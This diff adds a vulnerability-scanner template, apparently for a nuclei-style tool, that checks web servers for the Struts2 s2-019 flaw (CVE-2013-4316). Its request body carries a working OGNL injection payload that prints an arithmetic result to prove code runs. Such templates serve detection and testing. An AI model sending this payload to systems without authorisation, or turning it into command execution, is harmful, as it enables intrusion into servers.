@@ -1,0 +1,21 @@
+id: s2-019
+type: default
+info:
+  name: Struts2 s2-019 Dynamic method executions
+  risk: High
+  cve: CVE-2013-4316
+
+variables: |+
+  function main() {
+  return {'num1': randomNum(1,1000), 'num2': randomNum(2,1000)};
+  }
+
+
+requests:
+  - method: POST
+    redirect: false
+    url: '{{.URL}}'
+    body: "debug=command&expression=#p=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse').getWriter(),#p.println({{.num1}}-{{.num2}}),#p.close()"
+    matchers:
+      - dsl:
+          - "status_code==200 && contains(body, itoa({{.num1}}-{{.num2}}))"
